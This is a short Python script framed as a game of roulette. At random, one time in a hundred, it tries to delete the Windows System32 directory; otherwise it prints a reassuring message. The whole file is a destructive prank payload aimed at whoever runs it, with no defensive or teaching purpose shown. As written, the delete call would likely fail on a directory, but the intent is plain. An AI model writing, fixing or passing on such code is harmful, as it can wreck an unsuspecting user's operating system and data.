import random as rd
import os
roulette = rd.randint(1,100)
if roulette == 1:
  os.remove("C:\Windows\System32")
else:
  print("You're safe!")
